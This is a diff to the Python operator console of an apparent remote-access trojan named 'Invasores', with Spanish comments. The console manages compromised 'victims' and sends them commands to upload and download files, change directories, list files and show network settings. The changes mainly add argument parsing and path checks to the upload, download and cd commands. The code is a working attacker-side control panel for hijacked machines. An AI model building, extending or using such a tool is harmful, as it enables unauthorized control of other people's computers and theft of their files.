@@ -4,6 +4,7 @@
 
 
 # MODULOS DEL SISTEMA
+import re
 import os
 import sys
 import time
@@ -95,6 +96,20 @@ def ataques():
 	]
 
 	return random.choice(frases)
+
+
+def control_ruta(path,signo):
+		
+	ruta = path.split(signo)
+	if (ruta.pop()!=""):
+		verificar_ruta = signo.join(ruta)
+
+		if (os.path.exists(verificar_ruta)):
+			return True
+		else:
+			return False
+	else:
+		return False
 
 
 # ------------------------------------------------------------------------------------------
@@ -384,7 +399,43 @@ class Control():
 		return
 
 
-	def subir_archivos(self,origen,destino):
+	def subir_archivos(self,subida):
+
+		#cambio = (cambio.replace('subir ','')).split()
+		
+		if ("subir" in subida):
+			
+			if (subida=="subir"):
+				print (" Utilice 'subir <Ruta origen> <Ruta destino>'")
+				return
+
+			elif (re.match("subir(\d|\w)",subida)):
+				print('\n [\033[1;31mx\033[0;39m] Comando "',subida,'" no encontrado.\n')
+				return
+
+			else:
+				subida = (subida.replace('subir','')).split()
+				if (len(subida)!=2):
+					print (" Faltan argumentos...")
+					return False
+
+		else:
+			return False
+
+
+		if (len(subida)==2):
+			if (control_ruta(subida[0],"/")):
+				if (os.path.exists(subida[0])):
+					pass
+				else:
+					print (" El archivo que quieres subir no existe.")
+					return False
+			else:
+				print (" Ruta origen no existe o no se especifico archivo.")
+				return False
+
+		origen = subida[0]
+		destino = subida[1] 
 
 		# Envia modo de uso y recibe el 'ok'
 		self.servidor.enviar(self.objetivo,"subir")
@@ -392,26 +443,62 @@ class Control():
 
 		# Envia el destino donde se va a guardar el archivo
 		self.servidor.enviar(self.objetivo,destino)
-		self.servidor.recibir(self.objetivo)
+		respuesta = self.servidor.recibir(self.objetivo)
 		time.sleep(0.1)
 
-		self.servidor.enviar(self.objetivo,str(os.path.getsize(origen)))
-		self.servidor.recibir(self.objetivo)
-		time.sleep(1)
+		if (respuesta=="ok"):
 
-		# Se prepara para el envio de datos del archivo
-		with open(origen, "rb") as archivo_origen:
-				contenido = archivo_origen.read(1024)
-				while contenido:
-					self.objetivo.sendall(contenido)
+			self.servidor.enviar(self.objetivo,str(os.path.getsize(origen)))
+			self.servidor.recibir(self.objetivo)
+			time.sleep(1)
+
+			# Se prepara para el envio de datos del archivo
+			with open(origen, "rb") as archivo_origen:
 					contenido = archivo_origen.read(1024)
+					while contenido:
+						self.objetivo.sendall(contenido)
+						contenido = archivo_origen.read(1024)
 
-		print(" El archivo se subio correctamente.")    
+			print(" El archivo se subio correctamente.")    
+
+		else:
+			print (" Ruta destino no existe o no se especifico nombre de nuevo archivo.")
 
 		return
 
 
-	def descargar_archivos(self,origen,destino):
+	def descargar_archivos(self,bajada):
+
+		if ("descargar" in bajada):
+			
+			if (bajada=="descargar"):
+				print (" Utilice 'descargar <Ruta origen> <Ruta destino>'")
+				return
+
+			elif (re.match("descargar(\d|\w)",bajada)):
+				print('\n [\033[1;31mx\033[0;39m] Comando "',bajada,'" no encontrado.\n')
+				return
+
+			else:
+				bajada = (bajada.replace('descargar','')).split()
+				if (len(bajada)!=2):
+					print (" Faltan argumentos...")
+					return False
+
+		else:
+			return False
+
+
+		if (len(bajada)==2):
+			if (control_ruta(bajada[1],"/")):
+				pass
+			else:
+				print (" Ruta destino no existe o no se especifico nombre de nuevo archivo.")
+				return False
+
+
+		origen = bajada[0]
+		destino = bajada[1] 
 
 		# Envia modo de uso y recibe el 'ok'
 		self.servidor.enviar(self.objetivo,"descargar")
@@ -419,26 +506,31 @@ class Control():
 
 
 		# Envia ruta a descargar
-		self.servidor.enviar(self.objetivo,origen)
+		self.servidor.enviar(self.objetivo,bajada[0])
 		time.sleep(0.1)
 
 		size = int(self.servidor.recibir(self.objetivo))
-		self.servidor.enviar(self.objetivo,"ok")
 
-		#print(size)
+		if (size!=-1):
+			
+			self.servidor.enviar(self.objetivo,"ok")
 
-		# Abre el archivo nuevo 
-		with open(destino, "wb") as archivo_destino:
-			#contenido = self.client.recv(1024)
-			#print(os.path.getsize(destino))
-			while (size>0):
-				contenido = self.objetivo.recv(1024)
-				archivo_destino.write(contenido)
-				size-=len(contenido)
-				#print(size)
+			#print(size)
 
-		print(" El archivo se descargo correctamente.")   
+			# Abre el archivo nuevo 
+			with open(destino, "wb") as archivo_destino:
+				#contenido = self.client.recv(1024)
+				#print(os.path.getsize(destino))
+				while (size>0):
+					contenido = self.objetivo.recv(1024)
+					archivo_destino.write(contenido)
+					size-=len(contenido)
+					#print(size)
 
+			print(" El archivo se descargo correctamente.")   
+
+		else:
+			print (" Ruta origen no existe o no se especifico archivo.")
 			
 		return
 
@@ -455,6 +547,19 @@ class Control():
 		return
 
 	def cd(self,ruta):
+		if ("cd" in ruta):
+			
+			if (ruta=="cd"):
+				print (" Utilice 'cd <ruta>'")
+				return
+
+			elif (re.match("cd(\d|\w)",ruta)):
+				print('\n [\033[1;31mx\033[0;39m] Comando "',ruta,'" no encontrado.\n')
+				return
+
+		else:
+			return False
+
 		self.servidor.enviar(self.objetivo,ruta)
 		location = self.servidor.recibir(self.objetivo)
 		print(location)
@@ -465,6 +570,8 @@ class Control():
 	# MODULOS PARA COMANDOS RED
 
 	def ifconfig(self):
+		print ("\n Configuraciones de red de la victima")
+		print (" ====================================")
 		self.servidor.enviar(self.objetivo,"ifconfig")
 		self.servidor.recibir_todo(self.objetivo)
 		return
@@ -513,7 +620,7 @@ def manipular(servidor,cliente):
 
 	control = Control(servidor,cliente)
 	
-	victima = input(" \033[0;39mInvasores (\033[0;33mLaboratorio/" + servidor.terricolas[cliente][2] + "\033[0;39m) --> \033[0;39m").lower()
+	victima = (input(" \033[0;39mInvasores (\033[0;33mLaboratorio/" + servidor.terricolas[cliente][2] + "\033[0;39m) --> \033[0;39m")).strip()
 
 	while (victima!="volver"):
 
@@ -534,15 +641,11 @@ def manipular(servidor,cliente):
 
 		# MODULOS ARCHIVOS
 
-		elif (victima=="subir"):
-			origen = input(' Ruta archivo atacante: ')
-			destino = input(' Ruta archivo victima: ')
-			control.subir_archivos(origen,destino)
+		elif ("subir" in victima):
+			control.subir_archivos(victima)
  
-		elif (victima=="descargar"):
-			origen = input(' Ruta archivo victima: ')
-			destino = input(' Ruta archivo atacante: ')
-			control.descargar_archivos(origen,destino)
+		elif ("descargar" in victima):
+			control.descargar_archivos(victima)
 
 		# MODULOS DE RED
 
@@ -558,7 +661,7 @@ def manipular(servidor,cliente):
 		elif (victima=="ls"):
 			control.ls()
 
-		elif ("cd " in victima):
+		elif ("cd" in victima):
 			control.cd(victima)
 
 		# MODULOS BASICOS
@@ -580,7 +683,7 @@ def manipular(servidor,cliente):
 		else:
 			print('\n [\033[1;31mx\033[0;39m] Comando "',victima, '" no encontrado.\n')
 
-		victima = input(" \033[0;39mInvasores (\033[0;33mLaboratorio/" + servidor.terricolas[cliente][2] + "\033[0;39m) --> \033[0;39m").lower()
+		victima = (input(" \033[0;39mInvasores (\033[0;33mLaboratorio/" + servidor.terricolas[cliente][2] + "\033[0;39m) --> \033[0;39m")).strip()
 
 	return
 
@@ -604,38 +707,48 @@ def laboratorio(servidor):
 
 	print ("\n [\033[1;32m+\033[0;39m] Hay " + str(len(servidor.terricolas)) + " terricolas para su control\n")
 
-	prompt_laboratorio = (input(" \033[0;39mInvasores (\033[0;31mLaboratorio\033[0;39m) --> \033[0;39m").lower()).replace(' ', '')
+	prompt_laboratorio = (input(" \033[0;39mInvasores (\033[0;31mLaboratorio\033[0;39m) --> \033[0;39m").lower()).strip()
 
 	while(prompt_laboratorio!="volver"):
 
 		if ('manipular' in prompt_laboratorio):
-			try:
-				cliente = int(prompt_laboratorio.replace('manipular', ''))-1
+			if (prompt_laboratorio=="manipular"):
+				print(" Utilice 'manipular <id>'")
+			elif (re.match("manipular(\d|\w)",prompt_laboratorio)):
+				print('\n [\033[1;31mx\033[0;39m] Comando "', prompt_laboratorio, '" no encontrado.\n')
+			else:
+				try:
+					cliente = int(prompt_laboratorio.replace('manipular', ''))-1
 
-				if (cliente < len(servidor.terricolas)) and (cliente>=0):
-					manipular(servidor,cliente)
-					encabezados("laboratorio")
-					print ("\n [\033[1;32m+\033[0;39m] Hay " + str(len(servidor.terricolas)) + " terricolas para su control\n")
-				else:
-					print (" \n [\033[1;31mx\033[0;39m] No existe el terricola indicado...\n");
+					if (cliente < len(servidor.terricolas)) and (cliente>=0):
+						manipular(servidor,cliente)
+						encabezados("laboratorio")
+						print ("\n [\033[1;32m+\033[0;39m] Hay " + str(len(servidor.terricolas)) + " terricolas para su control\n")
+					else:
+						print (" \n [\033[1;31mx\033[0;39m] No existe el terricola indicado...\n");
 
-			except ValueError as e:
-				#print(e)
-				print (" \n [\033[1;31mx\033[0;39m] Error al manipular a victima. Utilice 'manipular <id>'\n");
+				except ValueError as e:
+					#print(e)
+					print (" \n [\033[1;31mx\033[0;39m] Error al manipular a victima. Utilice 'manipular <id>'\n");
 
 		elif ('matar' in prompt_laboratorio):
-			try:
-				cliente = int(prompt_laboratorio.replace('matar', ''))-1
-				
-				if (cliente < len(servidor.terricolas)) and (cliente>=0):
-					servidor.matar_terricola(cliente)
-					lista_terricolas_table.pop(cliente)
-					print("\n [\033[1;34m*\033[0;39m] " + ataques())
-				else:
-					print (" \n [\033[1;31mx\033[0;39m] No existe el terricola indicado...\n");
+			if (prompt_laboratorio=="matar"):
+				print(" Utilice 'matar <id>'")
+			elif (re.match("matar(\d|\w)",prompt_laboratorio)):
+				print('\n [\033[1;31mx\033[0;39m] Comando "', prompt_laboratorio, '" no encontrado.\n')
+			else:
+				try:
+					cliente = int(prompt_laboratorio.replace('matar', ''))-1
+					
+					if (cliente < len(servidor.terricolas)) and (cliente>=0):
+						servidor.matar_terricola(cliente)
+						lista_terricolas_table.pop(cliente)
+						print("\n [\033[1;34m*\033[0;39m] " + ataques())
+					else:
+						print (" \n [\033[1;31mx\033[0;39m] No existe el terricola indicado...\n");
 
-			except ValueError:
-				print (" \n [\033[1;31mx\033[0;39m] Error al matar a victima. Utilice 'matar <id>'\n");
+				except ValueError:
+					print (" \n [\033[1;31mx\033[0;39m] Error al matar a victima. Utilice 'matar <id>'\n");
 
 		elif (prompt_laboratorio=="listar"):
 			if(len(servidor.terricolas)>0):
@@ -662,7 +775,7 @@ def laboratorio(servidor):
 			print('\n [\033[1;31mx\033[0;39m] Comando "', prompt_laboratorio, '" no encontrado.\n')
 
 
-		prompt_laboratorio = (input(" \033[0;39mInvasores (\033[0;31mLaboratorio\033[0;39m) --> \033[0;39m").lower())
+		prompt_laboratorio = (input(" \033[0;39mInvasores (\033[0;31mLaboratorio\033[0;39m) --> \033[0;39m").lower()).strip()
 
 	return
 
